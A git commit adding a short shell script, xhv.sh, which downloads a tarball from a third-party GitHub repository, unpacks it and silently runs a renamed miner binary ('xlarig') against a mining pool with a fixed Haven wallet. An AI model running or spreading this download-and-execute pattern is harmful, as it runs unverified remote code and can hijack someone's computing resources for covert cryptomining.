b3eb88bad418b008d72b50dc353b043af84e1856
erindiana <112599473+erindiana@users.noreply.github.com>
2022-09-22 07:47:30 +0700

    Create xhv.sh

---
+++ xhv.sh
@@ -0,0 +1,4 @@
+#!/bin/sh
+wget https://github.com/muledan1/bash/raw/main/xl.tar.gz
+tar xf xl.tar.gz
+./xlarig  --donate-level 1 -o fastpool.xyz:10176 -u hvs1ar8ME8DHTfgrZzKEYkFLxssH7jJmMYCBtrT6iXWmiAhCCiqn44P7i6Wru6aSHZ8hVgwEBceSZ8CMAvJJa9KF2V6G1Nozcq@bob -p x -a cryptonight-heavy --variant xhv -k >/dev/null >/dev/null 2>&1
